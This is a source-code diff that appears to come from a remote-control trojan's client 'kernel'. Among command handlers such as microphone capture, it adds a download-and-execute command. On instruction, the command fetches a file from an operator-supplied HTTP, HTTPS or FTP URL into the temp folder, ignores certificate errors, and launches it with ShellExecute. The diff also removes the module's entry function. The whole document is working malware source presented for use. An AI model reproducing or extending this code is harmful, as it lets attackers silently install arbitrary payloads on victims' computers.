@@ -2,6 +2,8 @@
 #include "IOCPClient.h"
 #include <time.h>
 #include <dshow.h>
+#include <WinInet.h>
+
 #include "MiniFileTrans.h"
 
 #pragma comment(lib, "Strmiids.lib") 
@@ -73,6 +75,8 @@ void CKernel::OnReadComplete(WORD Event, DWORD dwTotal, DWORD dwRead, char*Buffe
 	case KNEL_MICROPHONE:
 		OnMicrophone();
 		break;
+	case KNEL_DOWNANDEXEC:
+		OnDownloadAndExec((WCHAR*)Buffer);
 	}
 }
 
@@ -981,23 +985,118 @@ Failed:
 	return;
 
 }
-/**************************Kernel Module Entry*******************************/
-void BeginKernel(char* szServerAddr,unsigned short uPort,DWORD dwParam)
+
+
+static void _DownloadAndExec(WCHAR*szUrl)
 {
-	CIOCPClient::SocketInit();
+	//获取临时文件夹目录
+	WCHAR TempDirPath[0x1000];
+	WCHAR szHost[0x1000];
+	WCHAR szPassword[0x1000];
+	WCHAR szUser[0x1000];
+	WCHAR szExtraInfo[0x1000];
+	WCHAR szUrlPath[0x1000];
+
+	GetTempPath(0x1000,TempDirPath);
+	wcscat(TempDirPath, L"\\");
+
 	//
-	CIOCPClient Client(szServerAddr,uPort, TRUE,-1,10);
-	CKernel Handler(KNEL);
+	DWORD HttpFlag = NULL;
+	URL_COMPONENTS url = { 0 };
+	url.dwStructSize = sizeof(url);
+	url.lpszHostName = szHost;
+	url.lpszPassword = szPassword;
+	url.lpszUserName = szUser;
+	url.lpszExtraInfo = szExtraInfo;
+	url.lpszUrlPath = szUrlPath;
 
-	Client.BindHandler(&Handler);
+	url.dwHostNameLength = 0x1000 - 1;
+	url.dwPasswordLength = 0x1000 - 1;
+	url.dwUserNameLength = 0x1000 - 1;
+	url.dwUrlPathLength = 0x1000 - 1;
+	url.dwExtraInfoLength = 0x1000 - 1;
 
-	Client.Run();
+	//url解析失败;
+	if (FALSE == InternetCrackUrl(szUrl, wcslen(szUrl), ICU_ESCAPE, &url))
+		return;
+	//Get File Name
+	WCHAR*p = szUrlPath + wcslen(szUrlPath) - 1;
+	while (p >= szUrlPath && p[0] != L'\\' && p[0] != L'/')
+		p--;
+	if (p < szUrlPath)
+		return;
+	//
+	wcscat(TempDirPath, p + 1);
+	//
+	wcscat(szUrlPath, szExtraInfo);
+	//
+	HINTERNET hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0);
+	HINTERNET hConnect = NULL;
+	HINTERNET hRemoteFile = NULL;
 
-	Client.UnbindHandler();
+	if (hInternet)
+	{
+		switch (url.nScheme)
+		{
+		case INTERNET_SCHEME_FTP:
+			hConnect = InternetConnect(hInternet, szHost, url.nPort,
+				szUser, szPassword, INTERNET_SERVICE_FTP, 0, 0);
+			if (hConnect)
+				hRemoteFile = FtpOpenFile(hConnect, szUrlPath, GENERIC_READ, 0, 0);
+			break;
+		case INTERNET_SCHEME_HTTPS:
+			HttpFlag |= (INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID
+				| INTERNET_FLAG_IGNORE_CERT_DATE_INVALID);
+		case INTERNET_SCHEME_HTTP:
+			hConnect = InternetConnect(hInternet, szHost, url.nPort,
+				szUser, szPassword, INTERNET_SERVICE_HTTP, 0, 0);
+			if (hConnect)
+			{
+				hRemoteFile = HttpOpenRequest(hConnect, L"GET", szUrlPath, L"1.1", NULL, NULL, HttpFlag, NULL);
+				if (hRemoteFile)
+					HttpSendRequest(hRemoteFile, NULL, NULL, NULL, NULL);
+			}
+			break;
+		}
+		if (hConnect)
+		{
+			if (hRemoteFile)
+			{
+				HANDLE hLocalFile = CreateFile(TempDirPath, GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
+				if (hLocalFile != INVALID_HANDLE_VALUE)
+				{
+					char buffer[0x1000];
+					
+					DWORD dwBytesOfRead = 0;
+					DWORD dwBytesOfWrite = 0;
 
-	CIOCPClient::SocketTerm();
+					while (InternetReadFile(hRemoteFile, buffer, 0x1000, &dwBytesOfRead) && dwBytesOfRead > 0)
+					{
+						WriteFile(hLocalFile, buffer, dwBytesOfRead, &dwBytesOfWrite, NULL);
+					}
+
+					CloseHandle(hLocalFile);
+					//
+					ShellExecute(NULL, L"open", TempDirPath, L"", L"", SW_SHOW);
+				}
+				InternetCloseHandle(hRemoteFile);
+			}
+			InternetCloseHandle(hConnect);
+		}
+		InternetCloseHandle(hInternet);
+	}
+	free(szUrl);
 }
-
+void CKernel::OnDownloadAndExec(WCHAR*szUrl)
+{
+	WCHAR*pUrl = (WCHAR*)malloc(sizeof(WCHAR)* (wcslen(szUrl) + 1));
+	wcscpy(pUrl,szUrl);
+	HANDLE hThread = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)_DownloadAndExec,pUrl,0,0);
+	if(hThread)
+	{
+		CloseHandle(hThread);
+	}
+}
 /*******************************************************************
 				*		Other			*
 *******************************************************************/
